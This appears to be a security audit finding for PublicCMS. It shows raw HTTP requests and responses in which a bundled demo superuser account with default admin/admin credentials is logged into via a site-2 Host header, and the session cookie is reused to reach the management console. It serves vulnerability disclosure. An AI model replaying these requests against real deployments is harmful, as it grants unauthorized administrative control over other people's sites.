### VULN-001 — unauthenticated default-cred superuser via Host header
### (1) Log in as the bundled demo superuser (site 2) with admin/admin
POST /admin/login HTTP/1.1
Host: site2.dev.publiccms.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

username=admin&password=admin

### -> HTTP/1.1 302
### -> Set-Cookie: PUBLICCMS_ADMIN=2_<uuid>; ... (the "2_" prefix = sys_user id 2 = demo superuser)
### -> Location: index.html

### (2) Reuse the session cookie to open the site-2 management console
GET /admin/index HTTP/1.1
Host: site2.dev.publiccms.com
Cookie: PUBLICCMS_ADMIN=2_<uuid-from-step-1>

### -> HTTP/1.1 200
### -> <title>企业中英文站点 - Management system</title>  (superuser dashboard)
